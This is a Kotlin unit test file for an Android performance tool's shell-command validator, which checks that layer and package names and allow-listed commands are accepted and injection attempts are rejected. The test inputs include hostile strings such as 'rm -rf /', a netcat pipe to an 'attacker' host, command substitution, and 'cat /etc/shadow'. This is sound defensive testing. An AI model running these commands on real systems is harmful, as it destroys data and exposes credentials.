package com.droidperf.system.shell

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class SafeCommandsTest {

    @Test
    fun `accepts real layer names`() {
        assertTrue(SafeCommands.isSafeLayerName("SurfaceView[com.example.game/com.example.game.MainActivity]#0"))
        assertTrue(SafeCommands.isSafeLayerName("com.example.game/com.example.game.MainActivity#0"))
    }
    @Test
    fun `rejects command injection attempts`() {
        assertFalse(SafeCommands.isSafeLayerName("foo; rm -rf /"))
        assertFalse(SafeCommands.isSafeLayerName("foo && reboot"))
        assertFalse(SafeCommands.isSafeLayerName("foo | nc attacker 1234"))
        assertFalse(SafeCommands.isSafeLayerName("foo`id`"))
        assertFalse(SafeCommands.isSafeLayerName("foo$(id)"))
        assertFalse(SafeCommands.isSafeLayerName("foo\nreboot"))
        assertFalse(SafeCommands.isSafeLayerName(""))
    }

    @Test
    fun `rejects package names with shell metacharacters`() {
        assertTrue(SafeCommands.isSafePackageName("com.example.game"))
        assertFalse(SafeCommands.isSafePackageName("com.example; reboot"))
        assertFalse(SafeCommands.isSafePackageName("com.example && id"))
    }

    @Test
    fun `rejects absurdly long names`() {
        assertFalse(SafeCommands.isSafeLayerName("a".repeat(300)))
    }

    @Test
    fun `allow-list accepts only our own commands`() {
        assertTrue(SafeCommands.isAllowedCommand(SafeCommands.SF_LAYER_LIST))
        assertTrue(SafeCommands.isAllowedCommand(SafeCommands.FOREGROUND_ACTIVITY))
        assertTrue(
            SafeCommands.isAllowedCommand(
                SafeCommands.layerLatency("SurfaceView[com.example.game/com.example.game.MainActivity]#0")
            )
        )
        assertTrue(SafeCommands.isAllowedCommand(SafeCommands.gfxInfoFramestats("com.example.game")))
        assertTrue(SafeCommands.isAllowedCommand(SafeCommands.KGSL_GPU_BUSY))
    }

    @Test
    fun `allow-list rejects arbitrary or injected commands`() {
        assertFalse(SafeCommands.isAllowedCommand("reboot"))
        assertFalse(SafeCommands.isAllowedCommand("rm -rf /"))
        assertFalse(SafeCommands.isAllowedCommand("cat /etc/shadow"))
        assertFalse(SafeCommands.isAllowedCommand("dumpsys SurfaceFlinger --latency 'a'; reboot"))
        assertFalse(SafeCommands.isAllowedCommand("dumpsys gfxinfo 'x' framestats; id"))
        assertFalse(SafeCommands.isAllowedCommand("cat /sys/class/kgsl/kgsl-3d0/gpubusy && reboot"))
    }
}
